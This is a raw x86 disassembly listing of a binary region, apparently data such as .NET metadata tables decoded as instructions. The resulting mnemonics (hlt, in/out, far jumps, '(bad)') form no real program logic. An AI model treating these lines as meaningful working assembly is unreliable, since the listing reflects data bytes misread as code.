  406335:	00 96 08 41 15 72    	add    %dl,0x72154108(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 4e 01 0a    	add    %dl,0xa014e00(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 63 09 84    	add    %dl,-0x7bf69d00(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 0b 0e 89    	add    %dl,-0x76f1f500(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 56 0a 0a    	add    %dl,0xa0a5600(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 92 03 94 00 10    	add    %dl,0x10009403(%edx)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 88 04 58 00 11    	add    %cl,0x11005804(%eax)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 12 24 9a    	add    %dl,-0x65dbee00(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 27 04 9a    	add    %dl,-0x65fbd900(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 59 1e 0a    	add    %dl,0xa1e5918(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 64 18 0a          	add    %ah,0xa(%eax,%ebx,1)
  4063c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	53                   	push   %ebx
  4063d3:	1e                   	push   %ds
  4063d4:	0e                   	push   %cs
  4063d5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 7a 0a 0a    	add    %dl,0xa0a7a00(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 b1 1b 1d    	add    %dl,0x1d1bb100(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 7a 05 1d    	add    %dl,0x1d057a00(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 6a 07 1d    	add    %dl,0x1d076a00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 4d 18             	add    %cl,0x18(%ebp)
  40641a:	1d 00 14 00 20       	sbb    $0x20001400,%eax
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 07                	add    %al,(%edi)
  406427:	01 1d 00 14 00 78    	add    %ebx,0x78001400
  40642d:	20 00                	and    %al,(%eax)
  40642f:	00 00                	add    %al,(%eax)
  406431:	00 86 18 53 1e 0e    	add    %al,0xe1e5318(%esi)
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 d7                	add    %dl,%bh
  406443:	23 c3                	and    %ebx,%eax
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 03                	add    %al,(%ebx)
  406451:	14 c7                	adc    $0xc7,%al
  406453:	00 14 00             	add    %dl,(%eax,%eax,1)
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 f0                	add    %dh,%al
  40645f:	24 53                	and    $0x53,%al
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 98 04 1d    	add    %dl,0x1d049800(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 11 16 0a    	add    %dl,0xa161100(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 c9 23 c3    	add    %dl,-0x3cdc3700(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 af 02 d5    	add    %dl,-0x2afd5100(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 e1 1b 0a    	add    %dl,0xa1be100(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 de 1a c3    	add    %dl,-0x3ce52200(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 50 07 1d    	add    %dl,0x1d075000(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 c2 08 0a    	add    %dl,0xa08c200(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 39    	add    %al,0x39209600(%eax)
  4064dd:	16                   	push   %ss
  4064de:	e0 00                	loopne 0x4064e0
  4064e0:	16                   	push   %ss
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 5d    	add    %al,0x5d209600(%eax)
  4064eb:	04 e4                	add    $0xe4,%al
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 89    	add    %al,-0x76df6a00(%eax)
  4064f9:	1c ec                	sbb    $0xec,%al
  4064fb:	00 19                	add    %bl,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 00                	add    %al,(%eax)
  406501:	00 80 00 96 20 ff    	add    %al,-0xdf6a00(%eax)
  406507:	06                   	push   %es
  406508:	f1                   	int1
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 0e    	add    %al,0xe209600(%eax)
  406515:	1b f8                	sbb    %eax,%edi
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 6f 05             	and    %ch,0x5(%edi)
  406524:	ff 00                	incl   (%eax)
  406526:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 7d 0b 1c    	add    %dl,0x1c0b7d00(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 46 05 0a    	add    %dl,0xa054600(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 1f                	add    %bl,(%edi)
  40654d:	08 0a                	or     %cl,(%edx)
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 cc 09 23    	add    %dl,0x2309cc00(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 19                	add    %bl,(%ecx)
  406569:	04 2a                	add    $0x2a,%al
  40656b:	01 24 00             	add    %esp,(%eax,%eax,1)
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 44 07 84    	add    %dl,-0x7bf8bc00(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 a8 01 1d    	add    %dl,0x1d01a800(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 59 1e 0a    	add    %dl,0xa1e5918(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 04 24 9a    	add    %dl,-0x65dbfc00(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 85 18 38 01 27    	add    %al,0x27013818(%ebp)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 78 24 0a    	add    %dl,0xa247800(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 90 16 3e    	add    %dl,0x3e169000(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 59 1e             	sbb    %bl,0x1e(%ecx)
  4065da:	0a 00                	or     (%eax),%al
  4065dc:	29 00                	sub    %eax,(%eax)
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	53                   	push   %ebx
  4065e7:	1e                   	push   %ds
  4065e8:	6b 01 29             	imul   $0x29,(%ecx),%eax
  4065eb:	00 56 22             	add    %dl,0x22(%esi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	86 00                	xchg   %al,(%eax)
  4065f4:	2b 25 70 01 2a 00    	sub    0x2a0170,%esp
  4065fa:	6c                   	insb   (%dx),%es:(%edi)
  4065fb:	41                   	inc    %ecx
  4065fc:	00 00                	add    %al,(%eax)
  4065fe:	00 00                	add    %al,(%eax)
  406600:	86 00                	xchg   %al,(%eax)
  406602:	db 08                	fisttpl (%eax)
  406604:	75 01                	jne    0x406607
  406606:	2b 00                	sub    (%eax),%eax
  406608:	6e                   	outsb  %ds:(%esi),(%dx)
  406609:	22 00                	and    (%eax),%al
  40660b:	00 00                	add    %al,(%eax)
  40660d:	00 86 00 96 01 70    	add    %al,0x70019600(%esi)
  406613:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 53 25 75    	add    %al,0x75255300(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 a3 03 7c 01    	addl   $0x17c03a3,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 59 1e 0a    	add    %dl,0xa1e5918(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 56 24             	add    %dl,0x24(%esi)
  40664a:	c7 00 30 00 40 45    	movl   $0x45400030,(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 e8                	add    %ch,%al
  406657:	1d 84 01 31 00       	sbb    $0x310184,%eax
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 8f 1e 2a    	add    %dl,0x2a1e8f00(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 a2 26 93 01 33    	add    %ah,0x33019326(%edx)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 5e 01 93    	add    %dl,-0x6cfea200(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 10                	add    %dl,(%eax)
  40668f:	08 93 01 35 00 10    	or     %dl,0x10003501(%ebx)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 d7                	add    %dl,%bh
  40669d:	05 84 01 36 00       	add    $0x360184,%eax
  4066a2:	b9 22 00 00 00       	mov    $0x22,%ecx
  4066a7:	00 96 00 a7 07 99    	add    %dl,-0x66f85900(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 5c 07 9f    	add    %dl,-0x60f8a400(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 af 05 a5    	add    %dl,-0x5afa5100(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 47 25 ab    	add    %dl,-0x54dab900(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	53                   	push   %ebx
  4066e3:	1e                   	push   %ds
  4066e4:	0e                   	push   %cs
  4066e5:	00 3b                	add    %bh,(%ebx)
  4066e7:	00 0b                	add    %cl,(%ebx)
  4066e9:	23 00                	and    (%eax),%eax
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	00 91 18 59 1e 0a    	add    %dl,0xa1e5918(%ecx)
  4066f3:	00 3b                	add    %bh,(%ebx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 53 1e b1    	add    %al,-0x4ee1ace8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 c9                	or     %ecx,%ecx
  40670d:	22 bb 01 3c 00 40    	and    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 87 23 bf 01 3c    	add    %eax,0x3c01bf23(%edi)
  40671f:	00 63 23             	add    %ah,0x23(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	d3 21                	shll   %cl,(%ecx)
  40672a:	0e                   	push   %cs
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 53 1e cb    	add    %al,-0x34e1ace8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 bd 0a d7    	add    %al,-0x28f54300(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 06 09 dc    	add    %al,-0x23f6fa00(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 c8 0b e2    	add    %al,-0x1df43800(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 24 21 e8    	add    %al,-0x17dedc00(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 e9 18 ee    	add    %al,-0x11e716f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	cc                   	int3
  40678b:	15 f4 01 42 00       	adc    $0x4201f4,%eax
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 ee 00 6b 01    	addl   $0x16b00ee,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 d4 1b 0e 00    	addl   $0xe1bd4,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 6d 17 d7 01    	addl   $0x1d7176d,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 d2 0d 0a 02    	addl   $0x20a0dd2,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	ea 07 dc 01 44 00 00 	ljmp   $0x0,$0x4401dc07
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 92 02 d7    	add    %al,-0x28fd6e00(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 3b 24 d7    	add    %al,-0x28dbc500(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 01 08 d7    	add    %al,-0x28f7ff00(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 e1 03 0f 02    	addl   $0x20f03e1,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 11 20 0f 02    	addl   $0x20f2011,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	1d 07 15 02 47       	sbb    $0x47021507,%eax
  406829:	00 5f 24             	add    %bl,0x24(%edi)
  40682c:	00 00                	add    %al,(%eax)
  40682e:	00 00                	add    %al,(%eax)
  406830:	86 00                	xchg   %al,(%eax)
  406832:	4c                   	dec    %esp
  406833:	16                   	push   %ss
  406834:	1a 02                	sbb    (%edx),%al
  406836:	48                   	dec    %eax
  406837:	00 d8                	add    %bl,%al
  406839:	48                   	dec    %eax
  40683a:	00 00                	add    %al,(%eax)
  40683c:	00 00                	add    %al,(%eax)
  40683e:	86 00                	xchg   %al,(%eax)
  406840:	53                   	push   %ebx
  406841:	05 1f 02 49 00       	add    $0x49021f,%eax
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	9f                   	lahf
  40684f:	16                   	push   %ss
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	d4 0e                	aam    $0xe
  40685e:	27                   	daa
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	3e 21 2b             	and    %ebp,%ds:(%ebx)
  40686d:	02 49 00             	add    0x0(%ecx),%cl
  406870:	bc 4a 00 00 00       	mov    $0x4a,%esp
  406875:	00 86 00 c6 24 31    	add    %al,0x3124c600(%esi)
  40687b:	02 4a 00             	add    0x0(%edx),%cl
  40687e:	85 24 00             	test   %esp,(%eax,%eax,1)
  406881:	00 00                	add    %al,(%eax)
  406883:	00 86 00 d2 1a 36    	add    %al,0x361ad200(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 72 0c             	add    %dh,0xc(%edx)
  406896:	3c 02                	cmp    $0x2,%al
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 82 16 42    	add    %al,0x42168200(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 d4 06 42    	add    %al,0x4206d400(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	d0 04 dc             	rolb   $1,(%esp,%ebx,8)
  4068c1:	01 50 00             	add    %edx,0x0(%eax)
  4068c4:	b0 24                	mov    $0x24,%al
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	00 00                	add    %al,(%eax)
  4068ca:	86 00                	xchg   %al,(%eax)
  4068cc:	ec                   	in     (%dx),%al
  4068cd:	08 0e                	or     %cl,(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 f5 01 6b    	add    %al,0x6b01f500(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 1e 0a 47    	add    %al,0x470a1e00(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 fe 0a 4b    	add    %al,0x4b0afe00(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	00 06                	add    %al,(%esi)
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	5a                   	pop    %edx
  406913:	21 55 02             	and    %edx,0x2(%ebp)
  406916:	54                   	push   %esp
  406917:	00 cc                	add    %cl,%ah
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	16                   	push   %ss
  406921:	27                   	daa
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	bc 02 6b 01 56       	mov    $0x56016b02,%esp
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	a1 00 0f 02 57       	mov    0x57020f00,%eax
  406941:	00 5c 53 00          	add    %bl,0x0(%ebx,%edx,2)
  406945:	00 00                	add    %al,(%eax)
  406947:	00 86 00 78 01 31    	add    %al,0x31017800(%esi)
  40694d:	02 58 00             	add    0x0(%eax),%bl
  406950:	c8 53 00 00          	enter  $0x53,$0x0
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	da 26                	fisubl (%esi)
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	e3 14                	jecxz  0x40697c
  406968:	47                   	inc    %edi
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	f0 14 6b             	lock adc $0x6b,%al
  406977:	01 59 00             	add    %ebx,0x0(%ecx)
  40697a:	45                   	inc    %ebp
  40697b:	25 00 00 00 00       	and    $0x0,%eax
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	4c                   	dec    %esp
  406983:	1d 23 02 5a 00       	sbb    $0x5a0223,%eax
  406988:	4d                   	dec    %ebp
  406989:	25 00 00 00 00       	and    $0x0,%eax
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	5a                   	pop    %edx
  406991:	1d 15 02 5a 00       	sbb    $0x5a0215,%eax
  406996:	56                   	push   %esi
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	79 21                	jns    0x4069c1
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
